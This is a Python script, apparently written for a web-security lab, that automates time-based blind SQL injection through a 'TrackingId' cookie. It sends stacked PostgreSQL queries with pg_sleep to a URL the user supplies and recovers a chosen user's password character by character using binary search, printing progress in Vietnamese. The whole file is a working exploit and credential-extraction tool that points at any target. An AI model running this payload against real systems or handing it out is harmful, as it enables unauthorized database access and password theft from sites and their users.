import string
import requests

url = input("Input URL: ")
Session = input("Input session: ")
TrackingId = input("Input TrackingID: ")
username = input("Input username: ")

SESSION = requests.Session()
cookies = {
    "TrackingId": TrackingId,
    "Session": Session,
}

###

def blindsql(condition: str) -> bool:
    
    payload = (
        f"{TrackingId}'%3BSELECT+CASE+WHEN+(username='{username}'+AND+"
        f"({condition}))+THEN+pg_sleep(4)+ELSE+pg_sleep(0)+END+FROM+users--"
    )
    
    current_cookies = cookies.copy()
    current_cookies["TrackingId"] = payload

    try:
        response = SESSION.get(url, cookies=current_cookies, timeout=10)
        if response.elapsed.total_seconds() >= 4:
            return True
    except requests.exceptions.RequestException:
        pass
        
    return False

###

def find_length(max_len=50) -> int:
    print("Start....")
    for n in range(1, max_len + 1):
        if blindsql(f"LENGTH(password)={n}"):
            return n
    raise RuntimeError("??? WTF if LENgth???")

###

def find_char_binary(position: int, lo=32, hi=126) -> str:
    while lo < hi:
        mid = (lo + hi) // 2
        if blindsql(f"ASCII(SUBSTRING(password,{position},1))>{mid}"):
            lo = mid + 1
        else:
            hi = mid
    return chr(lo)   

###

def extract_password(length: int) -> str:
    result = ""
    for pos in range(1, length + 1):
        ch = find_char_binary(pos)
        result += ch
        print(f"[+] Vị trí {pos}: {ch} -> Current password: {result}")
    return result

###

if __name__ == "__main__":
    print("Start...")
    try:
        n = find_length()
        print(f"[*] Độ dài mật khẩu: {n}")
        
        password = extract_password(n)
        print(f"[+] Mật khẩu hoàn chỉnh của {username}: {password}")
    except Exception as e:
        print(f"[!] Lỗi: {e}")